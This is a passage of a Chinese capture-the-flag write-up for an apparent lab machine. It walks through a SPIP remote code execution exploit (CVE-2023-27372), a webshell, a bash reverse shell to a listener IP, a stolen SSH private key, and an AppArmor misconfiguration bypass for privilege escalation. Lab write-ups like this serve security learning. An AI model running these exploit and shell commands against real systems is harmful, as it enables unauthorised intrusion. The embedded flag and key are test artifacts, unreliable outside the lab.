4.2.1.</span><br><span class="hljs-comment"># This PoC exploits a PHP code injection in SPIP. The vulnerability exists in the `oubli` parameter and allows an unauthenticated user to execute arbitrary commands with web user privileges.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Usage: python3 CVE-2023-27372.py http://example.com</span><br><br><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">import</span> bs4<br><span class="hljs-keyword">import</span> html<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parseArgs</span>():<br>    parser = argparse.ArgumentParser(description=<span class="hljs-string">&quot;Poc of CVE-2023-27372 SPIP &lt; 4.2.1 - Remote Code Execution by nuts7&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-u&quot;</span>, <span class="hljs-string">&quot;--url&quot;</span>, default=<span class="hljs-literal">None</span>, required=<span class="hljs-literal">True</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;SPIP application base URL&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;--command&quot;</span>, default=<span class="hljs-literal">None</span>, required=<span class="hljs-literal">True</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Command to execute&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-v&quot;</span>, <span class="hljs-string">&quot;--verbose&quot;</span>, default=<span class="hljs-literal">False</span>, action=<span class="hljs-string">&quot;store_true&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Verbose mode. (default: False)&quot;</span>)<br>    <span class="hljs-keyword">return</span> parser.parse_args()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_anticsrf</span>(<span class="hljs-params">url</span>):<br>    r = requests.get(<span class="hljs-string">&#x27;%s/spip.php?page=spip_pass&#x27;</span> % url, timeout=<span class="hljs-number">10</span>)<br>    soup = bs4.BeautifulSoup(r.text, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>    csrf_input = soup.find(<span class="hljs-string">&#x27;input&#x27;</span>, &#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;formulaire_action_args&#x27;</span>&#125;)<br>    <span class="hljs-keyword">if</span> csrf_input:<br>        csrf_value = csrf_input[<span class="hljs-string">&#x27;value&#x27;</span>]<br>        <span class="hljs-keyword">if</span> options.verbose:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Anti-CSRF token found : %s&quot;</span> % csrf_value)<br>        <span class="hljs-keyword">return</span> csrf_value<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] Unable to find Anti-CSRF token&quot;</span>)<br>        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_payload</span>(<span class="hljs-params">url, payload</span>):<br>    data = &#123;<br>        <span class="hljs-string">&quot;page&quot;</span>: <span class="hljs-string">&quot;spip_pass&quot;</span>,<br>        <span class="hljs-string">&quot;formulaire_action&quot;</span>: <span class="hljs-string">&quot;oubli&quot;</span>,<br>        <span class="hljs-string">&quot;formulaire_action_args&quot;</span>: csrf,<br>        <span class="hljs-string">&quot;oubli&quot;</span>: payload<br>    &#125;<br>    r = requests.post(<span class="hljs-string">&#x27;%s/spip.php?page=spip_pass&#x27;</span> % url, data=data)<br>    <span class="hljs-keyword">if</span> options.verbose:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Execute this payload : %s&quot;</span> % payload)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    options = parseArgs()<br><br>    csrf = get_anticsrf(url=options.url)<br>    send_payload(url=options.url, payload=<span class="hljs-string">&quot;s:%s:\&quot;&lt;?php system(&#x27;%s&#x27;); ?&gt;\&quot;;&quot;</span> % (<span class="hljs-number">20</span> + <span class="hljs-built_in">len</span>(options.command), options.command))<br></code></pre></td></tr></table></figure><p>随便写一个 <code>webshell.php</code></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">bash -i &gt;&amp; /dev/tcp/<span class="hljs-number">10</span>.<span class="hljs-number">14</span>.<span class="hljs-number">96</span>.<span class="hljs-number">254</span>/<span class="hljs-number">4444</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>然后</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">python  27372.py -u http://10.10.42.106/spip -c &#x27;echo &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(\<span class="hljs-variable">$_GET</span>[\<span class="hljs-string">&quot;cmd\&quot;]); ?&gt;</span></span><span class="language-xml">&quot; &gt; webshell.php&#x27; -v</span><br></code></pre></td></tr></table></figure><p>成功执行</p><p><img src="https://img.dkdun.cn/v1/2025/12/8d89673d178a5cf4.png"></p><p>查看有哪些用户目录，有一个 think 用户</p><p><img src="https://img.dkdun.cn/v1/2025/12/df7b3bfcdf52a69e.png"></p><p>查看用户目录文件</p><p><img src="https://img.dkdun.cn/v1/2025/12/5aae60656f929434.png"></p><p>访问<code>/user.txt</code> 拿到第一个 user flag </p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">fa229046d44eda6a3598c73ad96f4ca5  <br></code></pre></td></tr></table></figure><h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><p>发现有 <code>.ssh</code>，访问 <code>/home/think/.ssh </code>拿到私钥</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs cmd">-----BEGIN OPENSSH PRIVATE KEY-----<br>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn<br>NhAAAAAwEAAQAAAYEAxPvc9pijpUJA4olyvkW0ryYASBpdmBasOEls6ORw7FMgjPW86tDK<br>uIXyZneBIUarJiZh8VzFqmKRYcioDwlJzq+<span class="hljs-number">9</span>/<span class="hljs-number">2</span>ipQHTVzNjxxg18wWvF0WnK2lI5TQ7QXc<br>OY8+<span class="hljs-number">1</span>CUVX67y4UXrKASf8l7lPKIED24bXjkDBkVrCMHwScQbg/nIIFxyi262JoJTjh9Jgx<br>SBjaDOELBBxydv78YMN9dyafImAXYX96H5k+<span class="hljs-number">8</span>vC8/I3bkwiCnhuKKJ11TV4b8lMsbrgqbY<br>RYfbCJapB27zJ24a1aR5Un+Ec2XV2fawhmftS05b10M0QAnDEu7SGXG9mF/hLJyheRe8lv<br>+rk5EkZNgh14YpXG/E9yIbxB9Rf5k0ekxodZjVV06iqIHBomcQrKotV5nXBRPgVeH71JgV<br>QFkNQyqVM4wf6oODSqQsuIvnkB5l9e095sJDwz1pj/aTL3Z6Z28KgPKCjOELvkAPcncuMQ<br>Tu+z6QVUr0cCjgSRhw4Gy/bfJ4lLyX/bciL5QoydAAAFiD95i1o/eYtaAAAAB3NzaC1yc2<br>EAAAGBAMT73PaYo6VCQOKJcr5FtK8mAEgaXZgWrDhJbOjkcOxTIIz1vOrQyriF8mZ3gSFG<br>qyYmYfFcxapikWHIqA8JSc6vvf9oqUB01czY8cYNfMFrxdFpytpSOU0O0F3DmPPtQlFV+u<br><span class="hljs-number">8</span>uFF6ygEn/Je5TyiBA9uG145AwZFawjB8EnEG4P5yCBccotutiaCU44fSYMUgY2gzhCwQc<br>cnb+/GDDfXcmnyJgF2F/eh+ZPvLwvPyN25MIgp4biiiddU1eG/JTLG64Km2EWH2wiWqQdu<br><span class="hljs-number">8</span>yduGtWkeVJ/hHNl1dn2sIZn7UtOW9dDNEAJwxLu0hlxvZhf4SycoXkXvJb/q5ORJGTYId<br>eGKVxvxPciG8QfUX+ZNHpMaHWY1VdOoqiBwaJnEKyqLVeZ1wUT4FXh+<span class="hljs-number">9</span>SYFUBZDUMqlTOM<br>H+qDg0qkLLiL55AeZfXtPebCQ8M9aY/<span class="hljs-number">2</span>ky92emdvCoDygozhC75AD3J3LjEE7vs+kFVK9H<br>Ao4EkYcOBsv23yeJS8l/<span class="hljs-number">23</span>Ii+UKMnQAAAAMBAAEAAAGBAIIasGkXjA6c4eo+SlEuDRcaDF<br>mTQHoxj3Jl3M8+Au+<span class="hljs-number">0</span>P+<span class="hljs-number">2</span>aaTrWyO5zWhUfnWRzHpvGAi6+zbep/sgNFiNIST2AigdmA1QV<br>VxlDuPzM77d5DWExdNAaOsqQnEMx65ZBAOpj1aegUcfyMhWttknhgcEn52hREIqty7gOR5<br><span class="hljs-number">49</span>F0+<span class="hljs-number">4</span>+BrRLivK0nZJuuvK1EMPOo2aDHsxMGt4tomuBNeMhxPpqHW17ftxjSHNv+wJ4WkV<br><span class="hljs-number">8</span>Q7+MfdnzSriRRXisKavE6MPzYHJtMEuDUJDUtIpXVx2rl/L3DBs1GGES1Qq5vWwNGOkLR<br>zz2F+<span class="hljs-number">3</span>dNNzK6d0e18ciUXF0qZxFzF+hqwxi6jCASFg6A0YjcozKl1WdkUtqqw+Mf15q+KW<br>xlkL1XnW4/jPt3tb4A9UsW/ayOLCGrlvMwlonGq+s+<span class="hljs-number">0</span>nswZNAIDvKKIzzbqvBKZMfVZl4Q<br>UafNbJoLlXm+<span class="hljs-number">4</span>lshdBSRVHPe81IYS8C+<span class="hljs-number">1</span>foyX+f1HRkodpkGE0/<span class="hljs-number">4</span>/StcGv4XiRBFG1qQAA<br>AMEAsFmX8iE4UuNEmz467uDcvLP53P9E2nwjYf65U4ArSijnPY0GRIu8ZQkyxKb4V5569l<br>DbOLhbfRF/KTRO7nWKqo4UUoYvlRg4MuCwiNsOTWbcNqkPWllD0dGO7IbDJ1uCJqNjV+OE<br><span class="hljs-number">56</span>P0Z/HAQfZovFlzgC4xwwW8Mm698H/wss8Lt9wsZq4hMFxmZCdOuZOlYlMsGJgtekVDGL<br>IHjNxGd46wo37cKT9jb27OsONG7BIq7iTee5T59xupekynvIqbAAAAwQDnTuHO27B1PRiV<br>ThENf8Iz+Y8LFcKLjnDwBdFkyE9kqNRT71xyZK8t5O2Ec0vCRiLeZU/DTAFPiR+B6WPfUb<br>kFX8AXaUXpJmUlTLl6on7mCpNnjjsRKJDUtFm0H6MOGD/YgYE4ZvruoHCmQaeNMpc3YSrG<br>vKrFIed5LNAJ3kLWk8SbzZxsuERbybIKGJa8Z9lYWtpPiHCsl1wqrFiB9ikfMa2DoWTuBh<br>+Xk2NGp6e98Bjtf7qtBn/<span class="hljs-number">0</span>rBfdZjveM1MAAADBANoC+jBOLbAHk2rKEvTY1Msbc8Nf2aXe<br>v0M04fPPBE22VsJGK1Wbi786Z0QVhnbNe6JnlLigk50DEc1WrKvHvWND0WuthNYTThiwFr<br>LsHpJjf7fAUXSGQfCc0Z06gFMtmhwZUuYEH9JjZbG2oLnn47BdOnumAOE/mRxDelSOv5J5<br>M8X1rGlGEnXqGuw917aaHPPBnSfquimQkXZ55yyI9uhtc6BrRanGRlEYPOCR18Ppcr5d96<br>Hx4+A+YKJ0iNuyTwAAAA90aGlua0BwdWJsaXNoZXIBAg==<br>-----END OPENSSH PRIVATE KEY-----<br></code></pre></td></tr></table></figure><p>给 600 权限（最开始脑子抽了直接给的 777，后面才想起来它的权限最大才 600），用 ssh 登录</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">ssh think@<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">42</span>.<span class="hljs-number">106</span> -i id_rsa<br></code></pre></td></tr></table></figure><p>查找系统中所有设置了 SUID 的可执行文件</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">think@publisher:~$ <span class="hljs-title">find</span> / -<span class="hljs-title">perm</span> -<span class="hljs-title">u</span>=<span class="hljs-title">s</span> -<span class="hljs-title">type</span> <span class="hljs-title">f</span> 2&gt;/<span class="hljs-title">dev</span>/<span class="hljs-title">null</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">lib</span>/<span class="hljs-title">policykit</span>-1/<span class="hljs-title">polkit</span>-<span class="hljs-title">agent</span>-<span class="hljs-title">helper</span>-1</span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">lib</span>/<span class="hljs-title">openssh</span>/<span class="hljs-title">ssh</span>-<span class="hljs-title">keysign</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">lib</span>/<span class="hljs-title">eject</span>/<span class="hljs-title">dmcrypt</span>-<span class="hljs-title">get</span>-<span class="hljs-title">device</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">lib</span>/<span class="hljs-title">dbus</span>-1.0/<span class="hljs-title">dbus</span>-<span class="hljs-title">daemon</span>-<span class="hljs-title">launch</span>-<span class="hljs-title">helper</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">lib</span>/<span class="hljs-title">xorg</span>/<span class="hljs-title">Xorg.wrap</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">pppd</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">run_container</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>/<span class="hljs-title">at</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>/<span class="hljs-title">fusermount</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>/<span class="hljs-title">gpasswd</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>/<span class="hljs-title">chfn</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>/<span class="hljs-title">sudo</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>/<span class="hljs-title">chsh</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>/<span class="hljs-title">passwd</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>/<span class="hljs-title">mount</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>/<span class="hljs-title">su</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>/<span class="hljs-title">newgrp</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>/<span class="hljs-title">pkexec</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>/<span class="hljs-title">umount</span></span><br></code></pre></td></tr></table></figure><p>看到了一个不是典型的 SUID 文件</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">/usr/sbin/run_container<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/34ef96d874deacb2.png"></p><p>查看文件发现有一句 <code>bin/bash -p /opt/run_container.sh</code>，说明这将执行 <code>/opt/run_container.sh</code> ，查看 <code>run_container.sh</code> 内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br><span class="hljs-comment"># Function to list Docker containers</span><br><span class="hljs-function"><span class="hljs-title">list_containers</span></span>() &#123;<br>    <span class="hljs-keyword">if</span> [ -z <span class="hljs-string">&quot;<span class="hljs-subst">$(docker ps -aq)</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>        docker run -d --restart always -p 8000:8000 -v /home/think:/home/think 4b5aec41d6ef;<br>    <span class="hljs-keyword">fi</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;List of Docker containers:&quot;</span><br>    docker ps -a --format <span class="hljs-string">&quot;ID: &#123;&#123;.ID&#125;&#125; | Name: &#123;&#123;.Names&#125;&#125; | Status: &#123;&#123;.Status&#125;&#125;&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span><br>&#125;<br><br><span class="hljs-comment"># Function to prompt user for container ID</span><br><span class="hljs-function"><span class="hljs-title">prompt_container_id</span></span>() &#123;<br>    <span class="hljs-built_in">read</span> -p <span class="hljs-string">&quot;Enter the ID of the container or leave blank to create a new one: &quot;</span> container_id<br>    validate_container_id <span class="hljs-string">&quot;<span class="hljs-variable">$container_id</span>&quot;</span><br>&#125;<br><br><span class="hljs-comment"># Function to display options and perform actions</span><br><span class="hljs-function"><span class="hljs-title">select_action</span></span>() &#123;<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;OPTIONS:&quot;</span><br>    <span class="hljs-built_in">local</span> container_id=<span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span><br>    PS3=<span class="hljs-string">&quot;Choose an action for a container: &quot;</span><br>    options=(<span class="hljs-string">&quot;Start Container&quot;</span> <span class="hljs-string">&quot;Stop Container&quot;</span> <span class="hljs-string">&quot;Restart Container&quot;</span> <span class="hljs-string">&quot;Create Container&quot;</span> <span class="hljs-string">&quot;Quit&quot;</span>)<br><br>    <span class="hljs-keyword">select</span> opt <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;options[@]&#125;</span>&quot;</span>; <span class="hljs-keyword">do</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-variable">$REPLY</span> <span class="hljs-keyword">in</span><br>            1) docker start <span class="hljs-string">&quot;<span class="hljs-variable">$container_id</span>&quot;</span>; <span class="hljs-built_in">break</span> ;;<br>            2)  <span class="hljs-keyword">if</span> [ $(docker ps -q | <span class="hljs-built_in">wc</span> -l) -lt 2 ]; <span class="hljs-keyword">then</span><br>                    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;No enough containers are currently running.&quot;</span><br>                    <span class="hljs-built_in">exit</span> 1<br>                <span class="hljs-keyword">fi</span><br>                docker stop <span class="hljs-string">&quot;<span class="hljs-variable">$container_id</span>&quot;</span><br>                <span class="hljs-built_in">break</span> ;;<br>            3) docker restart <span class="hljs-string">&quot;<span class="hljs-variable">$container_id</span>&quot;</span>; <span class="hljs-built_in">break</span> ;;<br>            4) <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Creating a new container...&quot;</span><br>               docker run -d --restart always -p 80:80 -v /home/think:/home/think spip-image:latest<br>               <span class="hljs-built_in">break</span> ;;<br>            5) <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Exiting...&quot;</span>; <span class="hljs-built_in">exit</span> ;;<br>            *) <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Invalid option. Please choose a valid option.&quot;</span> ;;<br>        <span class="hljs-keyword">esac</span><br>    <span class="hljs-keyword">done</span><br>&#125;<br><br><span class="hljs-comment"># Main script execution</span><br>list_containers<br>prompt_container_id  <span class="hljs-comment"># Get the container ID from prompt_container_id function</span><br>select_action <span class="hljs-string">&quot;<span class="hljs-variable">$container_id</span>&quot;</span>  <span class="hljs-comment"># Pass the container ID to select_action function</span><br></code></pre></td></tr></table></figure><p>必须绕过当前的 shell 限制，才能重写 <code>run_container.sh</code>。并且在 <code>/opt</code> 目录下不能列出文件，但是使用<code>ls -al</code> 显示的是能够读取目录的内容的</p><p><img src="https://img.dkdun.cn/v1/2025/12/2f55ad8d8e7b30b4.png"></p><h2 id="AppArmor"><a href="#AppArmor" class="headerlink" title="AppArmor"></a>AppArmor</h2><p>再回想一下题目描述，“necessitating a deeper exploration into the system’s security profile”，需要对系统的安全配置文件进行更深入的探索</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Attempts <span class="hljs-built_in">to</span> escalate privileges <span class="hljs-keyword">using</span> <span class="hljs-keyword">a</span> custom binary are hindered <span class="hljs-keyword">by</span> restricted access <span class="hljs-built_in">to</span> critical <span class="hljs-keyword">system</span> <span class="hljs-built_in">files</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">directories</span>, necessitating <span class="hljs-keyword">a</span> deeper exploration <span class="hljs-keyword">into</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">system</span><span class="hljs-string">&#x27;s security profile to ultimately exploit a loophole that enables the execution of an unconfined bash shell and achieve privilege escalation.</span><br></code></pre></td></tr></table></figure><p>检查 ACL 和 SELinux 以及 AppArmor</p><p>（简单介绍一下 ACL ，SELinux，AppArmor：ACL 是访问控制表，是由很多条“deny|permit” 语句组成，每一条都是 rule，用于控制网络流量的进出。SELinux 是一个 Linux 内核模块，也是 Linux 的一个安全子系统，为了限制资源的访问。AppArmor 是与 SELinux 类似的一个访问控制系统，通过它可以指定程序的读写权限等等，其实我并不是很了解）</p><p>通过命令可以检测系统有无这些安全配置</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmd">getfacl /opt //检查 ACL<br>sestatus//检查 SELinux<br>apparmor_status//检查 AppArmor<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/d33c360805ef71cd.png"></p><p>“apparmor module is loaded ” 说明 AppArmor 已启用，AppArmor 策略位于 <code>/etc/apparmor.d/</code> 下</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查看 <code>/etc/apparmor.d/usr.sbin.ash</code> 内容</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">think@publisher:~$ <span class="hljs-title">cat</span> /<span class="hljs-title">etc</span>/<span class="hljs-title">apparmor.d</span>/<span class="hljs-title">usr.sbin.ash</span></span><br><span class="hljs-function">#<span class="hljs-title">include</span> &lt;<span class="hljs-title">tunables</span>/<span class="hljs-title">global</span>&gt;</span><br><span class="hljs-function"></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">ash</span> <span class="hljs-title">flags</span>=(<span class="hljs-title">complain</span>) &#123;</span><br><span class="hljs-function">  #<span class="hljs-title">include</span> &lt;<span class="hljs-title">abstractions</span>/<span class="hljs-title">base</span>&gt;</span><br><span class="hljs-function">  #<span class="hljs-title">include</span> &lt;<span class="hljs-title">abstractions</span>/<span class="hljs-title">bash</span>&gt;</span><br><span class="hljs-function">  #<span class="hljs-title">include</span> &lt;<span class="hljs-title">abstractions</span>/<span class="hljs-title">consoles</span>&gt;</span><br><span class="hljs-function">  #<span class="hljs-title">include</span> &lt;<span class="hljs-title">abstractions</span>/<span class="hljs-title">nameservice</span>&gt;</span><br><span class="hljs-function">  #<span class="hljs-title">include</span> &lt;<span class="hljs-title">abstractions</span>/<span class="hljs-title">user</span>-<span class="hljs-title">tmp</span>&gt;</span><br><span class="hljs-function"></span><br><span class="hljs-function">  # <span class="hljs-title">Remove</span> <span class="hljs-title">specific</span> <span class="hljs-title">file</span> <span class="hljs-title">path</span> <span class="hljs-title">rules</span></span><br><span class="hljs-function">  # <span class="hljs-title">Deny</span> <span class="hljs-title">access</span> <span class="hljs-title">to</span> <span class="hljs-title">certain</span> <span class="hljs-title">directories</span></span><br><span class="hljs-function">  <span class="hljs-title">deny</span> /<span class="hljs-title">opt</span>/ <span class="hljs-title">r</span>,</span><br><span class="hljs-function">  <span class="hljs-title">deny</span> /<span class="hljs-title">opt</span>/** <span class="hljs-title">w</span>,</span><br><span class="hljs-function">  <span class="hljs-title">deny</span> /<span class="hljs-title">tmp</span>/** <span class="hljs-title">w</span>,</span><br><span class="hljs-function">  <span class="hljs-title">deny</span> /<span class="hljs-title">dev</span>/<span class="hljs-title">shm</span> <span class="hljs-title">w</span>,</span><br><span class="hljs-function">  <span class="hljs-title">deny</span> /<span class="hljs-title">var</span>/<span class="hljs-title">tmp</span> <span class="hljs-title">w</span>,</span><br><span class="hljs-function">  <span class="hljs-title">deny</span> /<span class="hljs-title">home</span>/** <span class="hljs-title">w</span>,</span><br><span class="hljs-function">  /<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>/** <span class="hljs-title">mrix</span>,</span><br><span class="hljs-function">  /<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/** <span class="hljs-title">mrix</span>,</span><br><span class="hljs-function"></span><br><span class="hljs-function">  # <span class="hljs-title">Simplified</span> <span class="hljs-title">rule</span> <span class="hljs-title">for</span> <span class="hljs-title">accessing</span> /<span class="hljs-title">home</span> <span class="hljs-title">directory</span></span><br><span class="hljs-function">  <span class="hljs-title">owner</span> /<span class="hljs-title">home</span>/** <span class="hljs-title">rix</span>,</span><br><span class="hljs-function">&#125;</span><br></code></pre></td></tr></table></figure><p>仔细看看就会发现这个配置文件明显存在缺陷，<code>/dev/shm</code> 和 <code>/dev/tmp</code> 缺少了通配符，如果没有通配符，deny 规则仅仅会阻止更改具有这个名称的文件，但他的目录的内容不受影响，允许任意文件写入，所以我们可以写入 <code>/dev/shm</code> 和 <code>/var/tmp</code></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd">deny /dev/shm w,<br>deny /var/tmp w,<br></code></pre></td></tr></table></figure><p>之前访问 <code>/etc/passwd</code> 时会发现</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">root:<span class="hljs-title">x</span>:0:0:<span class="hljs-title">root</span>:/<span class="hljs-title">root</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>/<span class="hljs-title">bash</span></span><br></code></pre></td></tr></table></figure><p>那么复制 <code>/bin/bash </code>到 <code>/var/tmp</code> 并运行</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">cd</span> /var/tmp<br>cp /bin/bash .<br>./bash<br>ls /opt<br></code></pre></td></tr></table></figure><p>然后现在就可以访问 <code>/opt</code> 了</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 